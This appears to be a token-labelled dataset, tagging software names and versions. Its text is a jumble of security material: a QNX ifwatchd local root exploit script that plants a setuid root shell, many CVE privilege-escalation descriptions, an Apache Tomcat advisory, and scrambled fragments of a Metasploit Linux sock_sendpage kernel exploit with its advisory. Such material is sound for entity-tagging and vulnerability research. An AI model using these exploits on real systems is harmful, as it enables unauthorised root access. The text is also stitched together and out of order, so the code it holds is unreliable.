2 O
} O
) O
cp O
/bin/sh O
/tmp/shell O
chown O
root O
: O
root O
/tmp/shell O
chmod O
4755 O
/tmp/shell O
rm O
-f O
/tmp/0 O
kill O
-9 O
$ O
IFWPID O
exit O
0 O
_EOF_ O
chmod O
+x O
/tmp/0 O
echo O
[ O
- O
] O
executing O
ifwatchd O
, O
please O
wait O
ifwatchd O
-A O
/tmp/0 O
-v O
lo0 O
2 O
> O
& O
1 O
> O
/dev/null O
echo O
[ O
- O
] O
now O
executing O
suid O
shell O
/tmp/shell O

Unfortunately O
ifwatchd O
does O
not O
drop O
privileges O
when O
executing O
user O
supplied O
scripts O
. O

The O
fake O
arrival-script O
copies O
/bin/sh O
to O
/tmp/shell O
and O
makes O
it O
setuid O
root O
. O

- O
vulnerable O
platforms O
: O
QNX SN
6.5.0SP1 SV
QNX SN
6.5.0 SV
QNX SN
6.4.1 SV
exploit O
description O
: O
This O
exploit O
creates O
a O
fake O
arrival-script O
which O
will O
be O
executed O
as O
root O
by O
passing O
it O
to O
the O
-A O
parameter O
of O
/sbin/ifwatchd O
. O

! O
/bin/sh O
QNX O
6.4.x/6.5.x O
ifwatchd O
local O
root O
exploit O
by O
cenobyte O
2013 O
< O
vincitamorpatriae O
@ O
gmail.com O
vulnerability O
description O
: O
Setuid O
root O
ifwatchd O
watches O
for O
addresses O
added O
to O
or O
deleted O
from O
network O
interfaces O
and O
calls O
up/down O
scripts O
for O
them O
. O

- O
example O
: O
$ O
uname O
-a O
QNX O
localhost O
6.5.0 O
2010/07/09-14:44:03EDT O
x86pc O
x86 O
$ O
id O
uid=100 O
( O
user O
) O
gid=100 O
qnx-ifwatchd.sh O
QNX O
6.4.x/6.5.x O
ifwatchd O
local O
root O
exploit O
by O
cenobyte O
2013 O
creating O
fake O
arrival-script O
executing O
ifwatchd O
, O
please O
wait O
Killed O
now O
executing O
suid O
shell O
id O
uid=100 O
( O
user O
) O
gid=100 O
euid=0 O
( O
root O
) O
PATH=/bin O
: O
/usr/bin O
: O
/sbin O
if O
[ O
! O

QNX SN
6.4.x/6.5.x SV
ifwatchd O
- O
Local O
Privilege O
Escalation O

The O
ptmx_get_ioctl O
function O
in O
the O
ARM O
kernel O
in O
Apple SN
iOS SN
before SV
7.1 SV
and O
Apple SN
TV SN
before SV
6.1 SV
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
out-of-bounds O
memory O
access O
and O
device O
crash O
) O
via O
a O
crafted O
call O
. O

Unspecified O
vulnerability O
in O
IBM SN
Smart SN
Analytics SN
7700 SV
before SV
FP SV
2.1.3.0 SV
and SV
7710 SV
before SV
FP SV
2.1.3.0 SV
allows O
local O
users O
to O
gain O
privileges O
via O
vectors O
related O
to O
events O
. O

Untrusted O
search O
path O
vulnerability O
in O
Autodesk SN
AutoCAD SN
before SV
2014 SV
allows O
local O
users O
to O
gain O
privileges O
and O
execute O
arbitrary O
VBScript O
code O
via O
a O
Trojan O
horse O
FAS O
file O
in O
the O
FAS O
file O
search O
path O
. O

PineApp SN
Mail-SeCure SN
before SV
3.70 SV
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
by O
leveraging O
console O
access O
and O
providing O
shell O
metacharacters O
in O
a O
system O
ping O
command O
. O

virt-login-shell O
in O
libvirt SN
1.1.2 SV
through SV
1.1.3 SV
allows O
local O
users O
to O
overwrite O
arbitrary O
files O
and O
possibly O
gain O
privileges O
via O
unspecified O
environment O
variables O
or O
command-line O
arguments O
. O

Stack-based O
buffer O
overflow O
in O
the O
LRPC O
client O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
and SV
Server SV
2003 SV
SP2 SV
allows O
local O
users O
to O
gain O
privileges O
by O
operating O
an O
LRPC O
server O
that O
sends O
a O
crafted O
LPC O
port O
message O
, O
aka O
LRPC O
Client O
Buffer O
Overrun O
Vulnerability O
. O

Untrusted O
search O
path O
vulnerability O
in O
Cisco SN
Unified SN
Communications SN
Manager SN
( O
CUCM SN
) O
7.1 SV
( O
x SV
) O
through SV
9.1 SV
( O
1a SV
) O
allows O
local O
users O
to O
gain O
privileges O
by O
leveraging O
unspecified O
file-permission O
and O
environment-variable O
issues O
for O
privileged O
programs O
, O
aka O
Bug O
ID O
CSCui02276 O
. O

Race O
condition O
in O
win32k.sys O
in O
the O
kernel-mode O
drivers O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
Windows SN
Server SV
2003 SV
SP2 SV
, O
Windows SN
Vista SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
, O
R2 SV
, O
and SV
R2 SV
SP1 SV
, O
and O
Windows SN
7 SV
Gold SV
and SV
SP1 SV
allows O
local O
users O
to O
gain O
privileges O
, O
and O
consequently O
read O
the O
contents O
of O
arbitrary O
kernel O
memory O
locations O
, O
via O
a O
crafted O
application O
, O
a O
different O
vulnerability O
than O
other O
CVEs O
listed O
in O
MS13-016 O
. O

Symantec SN
LiveUpdate SN
Administrator SN
before SV
2.3.1 SV
uses O
weak O
permissions O
( O
Everyone O
: O
Full O
Control O
) O
for O
the O
installation O
directory O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
file O
. O

Untrusted O
search O
path O
vulnerability O
in O
IBM SN
Lotus SN
Expeditor SN
6.1.x SV
and SV
6.2.x SV
before SV
6.2 SV
FP5+Security O
Pack O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
DLL O
in O
the O
current O
working O
directory O
. O

Integer O
overflow O
in O
the O
ap_pregsub O
function O
in O
server/util.c O
in O
the O
Apache SN
HTTP SN
Server SN
2.0.x SV
through SV
2.0.64 SV
and SV
2.2.x SV
through SV
2.2.21 SV
, O
when O
the O
mod_setenvif O
module O
is O
enabled O
, O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
.htaccess O
file O
with O
a O
crafted O
SetEnvIf O
directive O
, O
in O
conjunction O
with O
a O
crafted O
HTTP O
request O
header O
, O
leading O
to O
a O
heap-based O
buffer O
overflow O
. O

Multiple O
heap-based O
buffer O
overflows O
in O
the O
virtio-blk O
driver O
( O
hw/virtio-blk.c O
) O
in O
qemu-kvm SN
0.14.0 SV
allow O
local O
guest O
users O
to O
cause O
a O
denial O
of O
service O
( O
guest O
crash O
) O
and O
possibly O
gain O
privileges O
via O
a O
( O
1 O
) O
write O
request O
to O
the O
virtio_blk_handle_write O
function O
or O
( O
2 O
) O
read O
request O
to O
the O
virtio_blk_handle_read O
function O
that O
is O
not O
properly O
aligned O
. O

HP SN
Palm SN
webOS SN
1.4.5 SV
and SV
1.4.5.1 SV
does O
not O
properly O
restrict O
Plug-in O
Development O
Kit O
( O
PDK O
) O
applications O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
by O
leveraging O
unintended O
filesystem O
write O
access O
. O

The O
Client/Server O
Run-time O
Subsystem O
( O
aka O
CSRSS O
) O
in O
the O
Win32 O
subsystem O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
Windows SN
Server SV
2003 SV
SP2 SV
, O
Windows SN
Vista SV
SP1 SV
and SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
Gold SV
, O
SP2 SV
, O
R2 SV
, O
and SV
R2 SV
SP1 SV
, O
and O
Windows SN
7 SV
Gold SV
and SV
SP1 SV
does O
not O
properly O
restrict O
the O
number O
of O
console O
objects O
for O
a O
process O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
application O
that O
triggers O
an O
incorrect O
memory O
assignment O
for O
a O
user O
transaction O
, O
aka O
CSRSS O
Local O
EOP O
AllocConsole O
Vulnerability O
. O

Unspecified O
vulnerability O
in O
the O
Rendition SN
Engine SN
( O
aka SN
P8RE SN
) O
4.0.1 SV
through SV
4.5.1 SV
in O
IBM O
FileNet O
P8 O
Content O
Manager O
( O
CM O
) O
allows O
remote O
attackers O
to O
gain O
privileges O
via O
unknown O
vectors O
. O

NOTE O
: O
some O
of O
these O
details O
are O
obtained O
from O
third O
party O
information O
. O

Multiple O
untrusted O
search O
path O
vulnerabilities O
in O
IBM SN
Lotus SN
Symphony SN
1.3.0 SV
20090908.0900 SV
allow O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
( O
1 O
) O
eclipse_1114.dll O
or O
( O
2 O
) O
emser645mi.dll O
file O
in O
the O
current O
working O
directory O
, O
as O
demonstrated O
by O
a O
directory O
that O
contains O
a O
.odm O
, O
.odt O
, O
.otp O
, O
.stc O
, O
.stw O
, O
.sxg O
, O
or O
.sxw O
file O
. O

Unspecified O
vulnerability O
in O
HP SN
System SN
Insight SN
Manager SN
before SV
6.0 SV
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
via O
unknown O
vectors O
. O

Multiple O
buffer O
overflows O
in O
the O
MSGFunctionDemarshall O
function O
in O
winscard_svc.c O
in O
the O
PC/SC O
Smart O
Card O
daemon O
( O
aka O
PCSCD O
) O
in O
MUSCLE SN
PCSC-Lite SN
before SV
1.5.4 SV
allow O
local O
users O
to O
gain O
privileges O
via O
crafted O
message O
data O
, O
which O
is O
improperly O
demarshalled O
. O

CRE SN
Loaded SN
before SV
6.2.14 SV
, O
and SV
possibly SV
other SV
versions SV
before SV
6.3.x SV
, O
allows O
remote O
attackers O
to O
bypass O
authentication O
and O
gain O
administrator O
privileges O
via O
a O
request O
with O
( O
1 O
) O
login.php O
or O
( O
2 O
) O
password_forgotten.php O
appended O
as O
the O
PATH_INFO O
, O
which O
bypasses O
a O
check O
that O
uses O
PHP_SELF O
, O
which O
is O
not O
properly O
handled O
by O
( O
a O
) O
includes/application_top.php O
and O
( O
b O
) O
admin/includes/application_top.php O
, O
as O
exploited O
in O
the O
wild O
in O
2009 O
. O

The O
Windows O
installer O
for O
Apache SN
Tomcat SN
6.0.0 SV
through SV
6.0.20 SV
, O
5.5.0 SV
through SV
5.5.28 SV
, O
and SV
possibly SV
earlier SV
versions O
uses O
a O
blank O
default O
password O
for O
the O
administrative O
user O
, O
which O
allows O
remote O
attackers O
to O
gain O
privileges O
. O

CVE-2009-3548 O
: O
Apache O
Tomcat O
Windows O
Installer O
insecure O
default O
administrative O
password O
Severity O
: O
Low O

Security O
researchers O
are O
reminded O
that O
undisclosed O
vulnerabilities O
in O
Apache O
Tomcat O
should O
, O
in O
the O
first O
instance O
, O
be O
reported O
to O
the O
private O
security O
mailing O
list O
. O

Vendor O
: O
The O
Apache O
Software O
Foundation O
Versions O

If O
this O
is O
not O
changed O
during O
the O
install O
process O
, O
then O
by O
default O
a O
user O
is O
created O
with O
the O
name O
admin O
, O
roles O
admin O
and O
manager O
and O
a O
blank O
password O
. O

References O
Mark O
Thomas O

Affected O
: O
Tomcat SN
5.5.0 SV
to SV
5.5.28 SV
Tomcat SN
6.0.0 SV
to SV
6.0.20 SV
The O
unsupported O
Tomcat SN
3.x SV
, O
4.0.x SV
, O
4.1.x SV
and SV
5.0.x SV
versions O
may O
be O
also O
affected O
. O

Description O
: O
The O
Windows O
installer O
defaults O
to O
a O
blank O
password O
for O
the O
administrative O
user O
. O

Mitigation O
: O
Users O
of O
all O
Tomcat O
versions O
may O
mitigate O
this O
issue O
by O
one O
of O
the O
following O
methods O
: O
- O
Using O
the O
.zip O
or O
.tar.gz O
distributions O
- O
Specifying O
a O
strong O
password O
for O
the O
admin O
user O
when O
using O
the O
Windows O
installer O
- O
Removing O
the O
admin O
user O
from O
the O
tomcat-users.xml O
file O
after O
the O
Windows O
installer O
has O
completed O
- O
Editing O
the O
tomcat-users.xml O
file O
to O
provide O
the O
admin O
user O
with O
a O
strong O
password O
after O
the O
Windows O
installer O
has O
completed O
A O
patch O
for O
this O
issue O
has O
been O
applied O
to O
trunk O
and O
will O
be O
included O
in O
the O
next O
releases O
of O
6.0.x O
and O
5.5.x O
Credit O
: O
This O
issue O
was O
reported O
directly O
to O
the O
tomcat O
users O
public O
mailing O
list O
by O
David O
Horheim O
. O

[ O
SECURITY O
] O
CVE-2009-3548 O
Apache O
Tomcat O
Windows O
Installer O
insecure O
default O
administrative O
password O

The O
Aclient O
GUI O
in O
Symantec SN
Altiris SN
Deployment SN
Solution SN
6.9.x SV
before SV
6.9 SV
SP3 SV
Build SV
430 SV
installs O
a O
client O
executable O
with O
insecure O
permissions O
( O
Everyone O
: O
Full O
Control O
) O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
by O
replacing O
the O
executable O
with O
a O
Trojan O
horse O
program O
. O

The O
Linux SN
kernel SN
2.6.0 SV
through SV
2.6.30.4 SV
, O
and SV
2.4.4 SV
through SV
2.4.37.4 SV
, O
does O
not O
initialize O
all O
function O
pointers O
for O
socket O
operations O
in O
proto_ops O
structures O
, O
which O
allows O
local O
users O
to O
trigger O
a O
NULL O
pointer O
dereference O
and O
gain O
privileges O
by O
using O
mmap O
to O
map O
page O
zero O
, O
placing O
arbitrary O
code O
on O
this O
page O
, O
and O
then O
invoking O
an O
unavailable O
operation O
, O
as O
demonstrated O
by O
the O
sendpage O
operation O
( O
sock_sendpage O
function O
) O
on O
a O
PF_PPPOX O
socket O
. O

external/source/meterpreter/source/bionic/libc/stdio/mktemp.c O
, O
] O
.each O
do O
|fname| O
print_status O
( O
Parsing O
c O
file O
{ O
fname O
} O
) O
cparser.parse O
( O
File.read O
( O
fname O
) O
, O
fname O
) O
end O
print_status O
( O
Unix O
socket.h O
) O
unix_socket_h O
( O
sc O
) O
current_task_struct_h O
( O
sc O
) O
case O
target.arch.first O
when O
ARCH_X86 O
print_status O
( O
syscall O
wrappers O
) O
linux_x86_syscall_wrappers O
( O
sc O
) O
main O
= O
% O
q^ O
ifdef O
x86_64 O
define O
PTR_FMT O
0x O
% O
016x O
else O
define O
PTR_FMT O
0x O
% O
08x O
endif O
define O
NULL O
( O
( O
void O
) O
0 O
) O
define O
DOMAINS_STOP O
-1 O
const O
int O
domains O
PF_BLUETOOTH O
, O
PF_APPLETALK O
, O
PF_IPX O
, O
PF_IRDA O
, O
PF_X25 O
, O
PF_AX25 O
, O
PF_BLUETOOTH O
, O
PF_PPPOX O
, O
DOMAINS_STOP O
} O
; O
int O
apparmor_enabled O
; O
int O
got_ring0 O
= O
0 O
; O
unsigned O
long O
uid O
, O
gid O
; O
static O
unsigned O
long O
get_kernel_sym O
( O
char O
name O
) O
{ O
FILE O
f O
; O
unsigned O
long O
addr O
; O
char O
dummy O
; O
char O
sname O
[ O
256 O
] O
; O
int O
ret O
; O
f O
= O
fopen O
( O
/proc/kallsyms O
, O
r O
) O
; O
if O
( O
f O
NULL O
) O
{ O
f O
= O
fopen O
( O
/proc/ksyms O
, O
r O
) O
; O
if O
( O
f O
NULL O
) O
{ O
printf O
( O
Unable O
to O
obtain O
symbol O
listing O
! O

) O
; O
} O
else O
{ O
exit O
( O
1 O
jmp O
dword O
near O
[ O
dword O
0x8 O
] O
mapped O
= O
xff O
; O
mapped O
= O
x25 O
; O
( O
unsigned O
long O
) O
& O
mapped O
= O
8 O
; O
( O
unsigned O
long O
) O
& O
mapped O
= O
( O
unsigned O
long O
) O
own_the_kernel O
; O
for O
( O
i O
= O
0 O
; O
i O
< O
16 O
; O
i++ O
) O
{ O
printf O
( O
x O
% O
02x O
, O
( O
unsigned O
char O
) O
mapped O
[ O
i O
] O
) O
; O
} O
printf O
for O
( O
d O
= O
0 O
; O
domains O
[ O
d O
] O
! O
= O
DOMAINS_STOP O
; O
d O
printf O
( O
Next O
domain O
out_fd O
= O
socket O
( O
domains O
[ O
d O
] O
, O
SOCK_DGRAM O
, O
0 O
) O
; O
if O
( O
out_fd O
0 O
) O
{ O
printf O
( O
Got O
domain O
[ O
% O
d O
] O
, O
d O
) O
; O
break O
; O
} O
if O
( O
out_fd O
< O
0 O
) O
{ O
printf O
( O
out_fd O
: O
% O
d O
, O
Errno O
: O
% O
d O
, O
out_fd O
, O
errno O
) O
; O
exit O
( O
1 O
unlink O
( O
template O
) O
; O
Couldn O
t O
get O
mkstemp O
to O
work O
, O
just O
use O
open O
( O
2 O
) O
for O
now O
in_fd O
= O
open O
( O
template O
, O
O_CREAT O
| O
O_RDWR O
, O
0777 O
) O
; O
printf O
( O
Opened O
temp O
file O
: O
% O
d O

elog O
Metasm O
Encoding O
failed O
class O

external/source/meterpreter/source/bionic/libc/unistd/perror.c O
, O
For O
some O
ungodly O
reason O
, O
NULL O
ends O
up O
being O
undefined O
when O
parsing O
this O
guy O
, O
which O
of O
course O
causes O
parse O
errors O
. O

) O
; O
return O
0 O
; O
} O
} O
ret O
= O
0 O
; O
while O
( O
ret O
! O
= O
EOF O
) O
{ O
ret O
= O
fscanf O
( O
f O
, O
% O
p O
% O
c O
% O
s O
, O
( O
void O
) O
& O
addr O
, O
& O
dummy O
, O
sname O
) O
; O
if O
( O
ret O
0 O
) O
{ O
fscanf O
( O
f O
, O
% O
s O
, O
sname O
) O
; O
continue O
; O
} O
if O
( O
! O
strcmp O
( O
name O
, O
sname O
) O
) O
{ O
printf O
Resolved O
% O
s O
to O
% O
p O
, O
name O
, O
( O
void O
) O
addr O
) O
; O
fclose O
( O
f O
) O
; O
return O
addr O
; O
} O
} O
fclose O
( O
f O
) O
; O
return O
0 O
; O
} O
static O
void O
change_cred O
( O
void O
) O
{ O
unsigned O
int O
task_struct O
; O
task_struct O
= O
( O
unsigned O
int O
) O
current_task_struct O
( O
) O
; O
while O
( O
task_struct O
) O
{ O
if O
( O
task_struct O
uid O
& O
& O
task_struct O
uid O
& O
& O
task_struct O
uid O
& O
& O
task_struct O
uid O
& O
& O
task_struct O
gid O
& O
& O
task_struct O
gid O
& O
& O
task_struct O
gid O
& O
& O
task_struct O
gid O
) O
{ O
task_struct O
= O
task_struct O
= O
task_struct O
= O
task_struct O
= O
task_struct O
= O
task_struct O
= O
task_struct O
= O
task_struct O
= O
0 O
; O
break O
; O
} O
task_struct++ O
; O
} O
return O
; O
} O
int O
attribute O

Please O
see O
the O
Metasploit O
web O
site O
for O
more O
information O
on O
licensing O
and O
terms O
of O
use O
. O

( O
/shellcode O
=/ O
) O
do O
split O
the O
payload O
into O
16-byte O
chunks O
and O
dump O
it O
out O
as O
a O
hex-escaped O
C O
string O
% O
Q|shellcode O
= O
{ O
payload.encoded.scan O
( O
/ O
. O

ifndef O
STDC O
define O
STDC O
0 O
endif O
include O
< O
sys/types.h O
include O
< O
sys/mman.h O
include O
< O
stdarg.h O
include O
< O
stdio.h O
include O
< O
unistd.h O
include O
< O
errno.h O
OpenBSD O
strcmp O
from O
string/strcmp.c O
in O
bionic O
int O
strcmp O
( O
const O
char O
s1 O
, O
const O
char O
s2 O
) O
{ O
while O
( O
s1 O
s2++ O
) O
if O
( O
s1++ O
0 O
) O
return O
( O
0 O
) O
; O
return O
( O
( O
unsigned O
char O
) O
s1 O
- O
( O
unsigned O
char O
) O
s2 O
external/source/meterpreter/source/bionic/libc/bionic O
errno.c O
, O
external/source/meterpreter/source/bionic/libc/bionic O
set_errno.c O
, O
external/source/meterpreter/source/bionic/libc/stdio/stdio.c O
, O
external/source/meterpreter/source/bionic/libc/unistd/mmap.c O
, O
This O
parses O
without O
any O
trouble O
, O
but O
actually O
calling O
perror O
( O
) O
causes O
immediate O
segfaults O
. O

( O
/shellcode_size O
= O
0/ O
, O
shellcode_size O
= O
{ O
payload.encoded.length O
} O
) O
cparser.parse O
( O
main O
, O
main.c O
) O
asm O
= O
cpu.new_ccompiler O
( O
cparser O
, O
sc O
) O
.compile O
sc.parse O
asm O
end O
sc.assemble O
begin O
if O
sc.kind_of O

elog O
Call O
stack O
backtrace.join O
return O
end O
puts O
Rex O
: O
:Text.to_hex_dump O
( O
foo O
) O
File.open O
( O
payload.bin O
, O
wb O
) O
{ O
|fd| O
fd.write O
elf O
} O
print_status O
Writing O
exploit O
executable O
( O
{ O
elf.length O
} O
bytes O
) O
cmd_exec O
( O
rm O
/tmp/sendpage O
) O
write_file O
( O
/tmp/sendpage O
, O
elf O
) O
output O
= O
cmd_exec O
( O
chmod O
+x O
/tmp/sendpage O
; O
/tmp/sendpage O
) O
output.each_line O
{ O
|line| O
print_debug O
line.chomp O
} O
cmd_exec O
( O
rm O
/tmp/sendpage O
) O
end O
end O

{ O
,16 O
} O
/ O
) O
.map O
{ O
|c|Rex O
: O
:Text.to_hex O
( O
c O
, O
x O
) O
} O
.join O
( O
% O
Q O
end O
main.gsub O
! O

This O
file O
is O
part O
of O
the O
Metasploit O
Framework O
and O
may O
be O
subject O
to O
redistribution O
and O
commercial O
restrictions O
. O

See O
external/source/meterpreter/source/bionic/libc/Jamfile O
cparser.lexer.include_search_path O
= O
[ O
external/source/meterpreter/source/bionic/libc/include O
, O
external/source/meterpreter/source/bionic/libc/private O
, O
external/source/meterpreter/source/bionic/libc/bionic O
, O
external/source/meterpreter/source/bionic/libc/kernel/arch-x86 O
, O
external/source/meterpreter/source/bionic/libc/kernel/common O
, O
external/source/meterpreter/source/bionic/libc/arch-x86/include O
, O
] O
cparser.parse O
( O
% O
Q| O
define O
DEBUGGING O
Fixes O
a O
parse O
error O
in O
bionic O
libc/kernel/arch-x86/asm/types.h O
ifndef O
extension O
define O
extension O
endif O
Fixes O
a O
parse O
error O
in O
bionic O
libc/include/sys/cdefs_elf.h O
Doing O
if O
on O
an O
undefined O
macro O
is O
fine O
in O
GCC O
, O
but O
a O
parse O
error O
in O
metasm O
. O

msf/core O
require O
rex O
require O
msf/core/post/common O
require O
msf/core/post/file O
require O
msf/core/post/linux/priv O
require O
msf/core/exploit/local/linux_kernel O
require O
msf/core/exploit/local/linux O
require O
msf/core/exploit/local/unix O
load O
lib/msf/core/post/file.rb O
load O
lib/msf/core/exploit/local/unix.rb O
load O
lib/msf/core/exploit/local/linux.rb O
load O
lib/msf/core/exploit/local/linux_kernel.rb O
class O
Metasploit4 O
< O
Msf O
: O
:Exploit O
: O
:Local O
Rank O
= O
ExcellentRanking O
include O
Msf O
: O
:Exploit O
: O
:EXE O
include O
Msf O
: O
:Post O
: O
:File O
include O
Msf O
: O
:Post O
: O
:Common O
include O
Msf O
: O
:Exploit O
: O
:Local O
: O
:LinuxKernel O
include O
Msf O
: O
:Exploit O
: O
:Local O
: O
:Linux O
include O
Msf O
: O
:Exploit O
: O
:Local O
: O
:Unix O
def O
initialize O
( O
info= O
{ O
} O
) O
super O
( O
update_info O
( O
info O
, O
{ O
Name O
= O
Linux O
Kernel O
Sendpage O
Local O
Privilege O
Escalation O
, O
Description O
= O
% O
q O
{ O
AKA O
Wunderbar O
Emporium O
} O
, O
License O
= O
MSF_LICENSE O
, O
Author O
pender O
, O
wunderbar_emporium.tgz O
rcvalle O
, O
sock_sendpage.c O
egypt O
metasploit O
module O
] O
, O
Platform O
linux O
Arch O
ARCH_X86 O
] O
, O
SessionTypes O
hell O
, O
meterpreter O
References O
CVE O
, O
2009-2692 O
URL O
URL O
Targets O
Linux O
x86 O
Arch O
= O
ARCH_X86 O
Linux O
x64 O
Arch O
= O
ARCH_X86_64 O
DefaultTarget O
= O
0 O
end O
def O
exploit O
sc O
= O
Metasm O
: O
:ELF.new O
( O
@ O
cpu O
) O
sc.parse O
% O
Q| O
define O
DEBUGGING O
define O
NULL O
( O
( O
void O
) O
0 O
) O
ifdef O
ELF O
.section O
.bss O
rwx O
.section O
.text O
rwx O
.entrypoint O
endif O
call O
main O
; O
push O
eax O
call O
exit O
| O

Metasm O
: O
:ELF O
elf O
= O
sc.encode_string O
else O
foo O
= O
sc.encode_string O
elf O
= O
Msf O
: O
:Util O
: O
:EXE.to_linux_x86_elf O
( O
framework O
, O
foo O
) O
end O
rescue O
print_error O
Metasm O
Encoding O
failed O

Linux SN
Kernel SN
2.4.4 SV
< SV
2.4.37.4 SV
2.6.0 SV
< SV
2.6.30.4 SV
- O
Sendpage O
Local O
Privilege O
Escalation O
( O
Metasploit O
) O

Mirror O
: O
( O
android-root-20090816.tar.gz O
) O
milw0rm.com O
[ O
2009-08-18 O
] O

Source O
for O
exploiting O
CVE-2009-2692 O
on O
Android O
; O
Hole O
is O
closed O
in O
Android O
kernels O
released O
August O
2009 O
or O
later O
. O

Linux SN
Kernel SN
2.x SV
( O
Android O
) O
- O
ock_sendpage O
( O
) O
Local O
Privilege O
Escalation O

Linux O
NULL O
pointer O
dereference O
due O
to O
incorrect O
proto_ops O
initializations O
- O
In O
the O
Linux O
kernel O
, O
each O
socket O
has O
an O
associated O
struct O
of O
operations O
called O
proto_ops O
which O
contain O
pointers O
to O
functions O
implementing O
various O
features O
, O
such O
as O
accept O
, O
bind O
, O
shutdown O
, O
and O
so O
on O
. O

Solution O
Linus O
committed O
a O
patch O
correcting O
this O
issue O
on O
13th O
August O
2009. O
t O
; O
h=e694958388c50148389b0e9b9e9e8945cf0f1b98 O
Credit O
This O
bug O
was O
discovered O
by O
Tavis O
Ormandy O
and O
Julien O
Tinnes O
of O
the O
Google O
Security O
Team O
. O

Successful O
exploitation O
will O
lead O
to O
complete O
attacker O
control O
of O
the O
system O
. O

We O
have O
identified O
several O
examples O
where O
the O
initialization O
is O
incomplete O
: O
- O
The O
SOCKOPS_WRAP O
macro O
defined O
in O
include/linux/net.h O
, O
which O
appears O
correct O
at O
first O
glance O
, O
was O
actually O
affected O
. O

In O
order O
to O
exploit O
this O
, O
an O
attacker O
would O
create O
a O
mapping O
at O
address O
zero O
containing O
code O
to O
be O
executed O
with O
privileges O
of O
the O
kernel O
, O
and O
then O
trigger O
a O
vulnerable O
operation O
using O
a O
sequence O
like O
this O
int O
fdin O
= O
mkstemp O
( O
template O
) O
; O
int O
fdout O
= O
socket O
( O
PF_PPPOX O
, O
SOCK_DGRAM O
, O
0 O
) O
; O
unlink O
( O
template O
) O
; O
ftruncate O
( O
fdin O
, O
PAGE_SIZE O
) O
; O
sendfile O
( O
fdout O
, O
fdin O
, O
NULL O
, O
PAGE_SIZE O
Please O
note O
, O
sendfile O
( O
) O
is O
just O
one O
of O
many O
ways O
to O
cause O
a O
sendpage O
operation O
on O
a O
socket O
. O

This O
is O
not O
always O
a O
security O
issue O
, O
as O
the O
kernel O
validates O
the O
pointers O
at O
the O
call O
site O
, O
such O
as O
this O
example O
from O
sock_splice_read O
: O
static O
ssize_t O
sock_splice_read O
( O
struct O
file O
file O
, O
loff_t O
ppos O
, O
struct O
pipe_inode_info O
pipe O
, O
size_t O
len O
, O
unsigned O
int O
flags O
) O
{ O
struct O
socket O
sock O
= O
file- O
> O
private_data O
; O
if O
( O
unlikely O
( O
! O
sock- O
> O
ops- O
> O
splice_read O
) O
) O
return O
-EINVAL O
; O
return O
sock- O
> O
ops- O
> O
splice_read O
( O
sock O
, O
ppos O
, O
pipe O
, O
len O
, O
flags O
) O
; O
} O
But O
we O
have O
found O
an O
example O
where O
this O
is O
not O
the O
case O
; O
the O
sock_sendpage O
( O
) O
routine O
does O
not O
validate O
the O
function O
pointer O
is O
valid O
before O
dereferencing O
it O
, O
and O
therefore O
relies O
on O
the O
correct O
initialization O
of O
the O
proto_ops O
structure O
. O

It O
should O
also O
be O
noted O
that O
all O
kernels O
up O
to O
2.6.30.2 O
are O
vulnerable O
to O
published O
attacks O
against O
mmap_min_addr O
. O

taviso O
( O
at O
) O
sdf.lonestar O
( O
dot O
) O
org O
[ O
email O
concealed O
] O
| O
finger O
me O
for O
my O
gpg O
key O
. O

If O
an O
operation O
on O
a O
particular O
socket O
is O
unimplemented O
, O
they O
are O
expected O
to O
point O
the O
associated O
function O
pointer O
to O
predefined O
stubs O
, O
for O
example O
if O
the O
accept O
operation O
is O
undefined O
it O
would O
point O
to O
sock_no_accept O
( O
) O
. O

However O
, O
administrators O
should O
be O
aware O
that O
LSM O
based O
mandatory O
access O
control O
systems O
, O
such O
as O
SELinux O
, O
may O
alter O
this O
functionality O
. O

Mitigation O
Recent O
kernels O
with O
mmap_min_addr O
support O
may O
prevent O
exploitation O
if O
the O
sysctl O
vm.mmap_min_addr O
is O
set O
above O
zero O
. O

- O
Initializations O
were O
missing O
in O
other O
protocols O
, O
including O
PF_BLUETOOTH O
, O
PF_IUCV O
, O
PF_INET6 O
( O
with O
IPPROTO_SCTP O
) O
, O
PF_PPPOX O
and O
PF_ISDN O
. O

However O
, O
we O
have O
found O
that O
this O
is O
not O
always O
the O
case O
and O
some O
of O
these O
pointers O
are O
left O
uninitialized O
. O

Affected O
Software O
All O
Linux SN
2.4/2.6 SV
versions O
since O
May O
2001 O
are O
believed O
to O
be O
affected O
: O
- O
Linux SN
2.4 SV
, O
from SV
2.4.4 SV
up SV
to SV
and SV
including SV
2.4.37.4 SV
- O
Linux SN
2.6 SV
, O
from SV
2.6.0 SV
up SV
to SV
and SV
including SV
2.6.30.4 SV
Consequences O
This O
issue O
is O
easily O
exploitable O
for O
local O
privilege O
escalation O
. O

This O
includes O
PF_APPLETALK O
, O
PF_IPX O
, O
PF_IRDA O
, O
PF_X25 O
and O
PF_AX25 O
families O
. O

Linux O
NULL O
pointer O
dereference O
due O
to O
incorrect O
proto_ops O
initializations O

This O
file O
is O
distributed O
under O
the O
terms O
of O
the O
MIT O
License O
. O

Furthermore O
, O
rPath O
Linux O
does O
not O
include O
two O
other O
mechanisms O
by O
which O
this O
vulnerability O
has O
been O
exploited O
( O
pulseaudio O
and O
SELinux O
policy O
permitting O
access O
to O
address O
0 O
) O
. O

A O
copy O
is O
available O
at O

rPath O
Security O
Advisory O
: O
2009-0121-1 O
Published O
: O
2009-08-18 O
Products O
: O
rPath O
Appliance O
Platform O
Linux O
Service O
1 O
rPath O
Appliance O
Platform O
Linux O
Service O
2 O
rPath O
Linux O
2 O
Rating O
: O
Minor O
Exposure O
Level O
Classification O
: O
Local O
